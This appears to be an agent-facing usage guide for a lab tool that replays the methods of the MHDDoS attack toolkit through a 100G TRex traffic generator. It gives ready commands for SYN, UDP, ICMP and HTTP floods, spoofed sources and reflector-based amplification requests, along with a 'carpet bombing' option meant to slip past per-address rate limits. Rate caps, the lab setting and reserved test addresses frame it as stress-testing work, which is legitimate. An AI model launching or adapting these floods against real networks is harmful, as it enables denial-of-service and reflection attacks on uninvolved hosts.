# Agent usage — mhddos-trex on the TRex test VM

Everything below runs **on the VM**, not on a workstation: TRex restricts its control
plane to loopback.

```
VM         root@10.172.10.34   (Debian 13, hostname debian)
TRex       /opt/v3.07          v3.07, net_mlx5, port 0 = 100G link, port 1 = dummy
Python     /opt/trex-python/bin/python3   3.11 with TRex's vendored scapy 2.4.3
Package    /opt/mhddos-trex/lib           `mhddos_trex`
MHDDoS     /opt/mhddos-trex/MHDDoS        start.py + files/, parsed never imported
CLI        /usr/local/bin/mhddos-trex     sets PYTHONPATH and MHDDOS_DIR itself
Guide      /opt/mhddos-trex/AGENT-USAGE.md
```

## Preconditions

```sh
systemctl is-active trex                        # must print active
mhddos-trex list                                # must print the 46-method table
```

`list` prints one line per MHDDoS method with a verdict. Only `wire` and `shape` can be
emitted; `needs_astf` and `client_logic` are refused by `run` and `dry-run` with a reason.
36 of 46 methods are emittable.

Confirm the port is idle before you start, and that it is idle again when you finish:

```sh
PYTHONPATH=/opt/v3.07/automation/trex_control_plane/interactive \
  /opt/trex-python/bin/python3 -W ignore -c '
from trex.stl.api import STLClient
c = STLClient(server="127.0.0.1", verbose_level="error"); c.connect()
print(c.get_port_info([0])[0]["status"])   # IDLE
c.disconnect()'
```

Only port `0` exists on this VM. Always pass `--trex-port 0`.

## Commands

```sh
mhddos-trex list                                  # coverage table, no traffic
mhddos-trex dry-run GET --victim 198.19.0.100     # compiled profile JSON, no traffic
mhddos-trex run GET --victim 198.19.0.100 --pps 100 --flows 2 --seconds 2 --trex-port 0
```

`run` prints one JSON object per profile:

```json
{"profile": "GET", "seconds": 2, "sent": 200, "pps": 100, "l1_gbps": 0.001,
 "frame_bytes": 699, "flows": 2, "oerrors": 0}
```

`sent` is the port's own TX counter. `pps` is what was achieved, not what was asked.
Treat `oerrors` non-zero, or `sent` far below `pps * seconds`, as a failure.

Options that change the attack, not just the rate:

| Option | Meaning |
|---|---|
| `--victim` | packet destination; required for every profile |
| `--host` | hostname used in `Host:` when it differs from `--victim` |
| `--dport` | destination port; defaults to 80, or 443 with `--scheme https` |
| `--pps` | total across all flows, not per flow |
| `--flows` | number of parallel streams; each gets `pps/flows` |
| `--src-prefix` | source pool for `pool` profiles, default `203.0.113.0/24` |
| `--size` | pad frames to this L2 size; above 1518 requests jumbo frames |
| `--reflectors` | file of reflector addresses, one per line, for the amplification profiles |
| `--carpet` | IPv4 prefix; draw a fresh destination inside it for every packet |
| `--out` | write the whole result list as JSON |

`run all` exists but starts 29–36 profiles at once; use it only for a few seconds at low
rate.

### Carpet bombing

`--carpet <cidr>` aims every packet at a different host inside the prefix, so per-address
rate limits see one packet each instead of a flood:

```sh
mhddos-trex run SYN --victim 198.19.0.100 --carpet 198.19.0.0/24 --pps 1000 --seconds 5
mhddos-trex run all --victim 198.19.0.100 --carpet 198.19.0.0/24 --pps 50 --seconds 1
```

The field engine draws the address per packet, so the prefix size is what makes the attack
wide, not the flow count. Source addresses are spoofed too, and because no host is hit
twice there is no TCP session to keep coherent; `--victim` still only supplies the `Host:`
header. Naming an amplification profile together with `--carpet` is refused (the reflector
list *is* the destination); `run all --carpet` silently drops those seven.

## Safety for an automated caller

1. Check `systemctl is-active trex` and the port `IDLE` first.
2. Never ask for more than the lab agreed. Start at `--pps 100 --seconds 2` and confirm
   `oerrors` is 0 before raising the rate.
3. Always pass `--seconds`; nothing here runs unbounded by accident, but a forgotten
   default of 10 seconds at 100k pps is 1M frames.
4. Re-read the port `IDLE` afterwards. A crashed caller can leave streams loaded; clear
   them with the second command below if a run is interrupted.

```sh
# stop and clear whatever a previous run left behind
PYTHONPATH=/opt/v3.07/automation/trex_control_plane/interactive \
  /opt/trex-python/bin/python3 -W ignore -c '
from trex.stl.api import STLClient
c = STLClient(server="127.0.0.1", verbose_level="error"); c.connect()
c.acquire(ports=[0], force=True); c.stop(ports=[0])
c.remove_all_streams(ports=[0]); c.release(ports=[0]); c.disconnect()'
```

## Coverage

- `wire` — payload and header layout identical to MHDDoS. TCP, UDP, ICMP, the seven
  amplification requests, and the layer-7 families (GET/POST/HEAD/PPS/NULL/COOKIE/DYN/
  RHEX/STOMP/GSB/APACHE/XMLRPC/STRESS).
- `shape` — same request shape, no handshake or response-driven step (TCP/BOT/EVEN/AVB/
  KILLER/CFBUAM/OVH).
- `needs_astf` — MINECRAFT, CPS, CONNECTION, MCBOT, SLOW, DOWNLOADER. These need a live
  TCP session; STL cannot open one.
- `client_logic` — CFB, BYPASS, DGB, TOR. The distinguishing behaviour is in the attacking
  client, nothing on the wire; TOR can be approximated with `--host`.

Amplification profiles emit the **request** only: source is the victim, destination
rotates over the reflector list. No amplified response volume is produced.

## Verified on this VM

2026-11-16, port 0 on net_mlx5, 100G, IDLE before and after: `run all` at 50 pps for one
second executed all 36 emittable profiles, 2,870 frames total, `sent` non-zero and
`oerrors` 0 for every one of them. GET, DNS, SYN, UDP and ICMP were also run individually
at 100 pps with zero output errors.

2026-11-19: `run all --carpet 198.19.0.0/24` executed the 29 profiles that accept a carpet
destination, 650 frames, all non-zero, `oerrors` 0. The destination spread itself is
checked off hardware, in TRex's own data plane: `tests/test_dataplane.py` runs the profile
through `bp-sim-64` and asserts every emitted destination lands inside the prefix and that
the addresses differ packet to packet.

For reference, off hardware the same profiles sustain 1M and 10M pps exactly as asked
(see the repository README). The 100G link is the ceiling here, not the generator.

## Failure modes

| Symptom | Cause and fix |
|---|---|
| `TRex server unreachable at 127.0.0.1` | `systemctl start trex`, then wait ~15 s for the port to settle |
| `systemctl status trex` shows `failed` after a clean stop | `KillSignal=SIGINT` makes the wrapper exit 255; check the counters, not the unit state, to judge a run |
| `EAL: Cannot create lock on '/var/run/dpdk/rte/config'` | a `_t-rex-64` started by hand is still running. `kill -INT <pid>`, wait for `/mnt/huge` to empty, then `systemctl start trex` |
| `Failed resolving dest MAC for default gateway:0.0.0.0` | the config has no `default_gw`; harmless for STL, the stream carries its own MACs |
| `port(s) [1]: invalid port IDs` | this VM exposes port `0` only |
| No traffic on the switch | the stream's destination MAC must be the lab gateway MAC or the DUT's |

## Redeploying

From a workstation holding both `mhddos-trex` and the `MHDDoS` checkout:

```sh
scripts/install-remote.sh                      # HOST, PREFIX, TREX_HOME, PYTHON overridable
```

The script ships the package plus `MHDDoS/start.py` and `MHDDoS/files/`, installs it into
`$PREFIX/lib`, writes the wrapper, and copies this guide to `$PREFIX/AGENT-USAGE.md`. It
ends by running `mhddos-trex list`, so a broken deploy fails loudly.
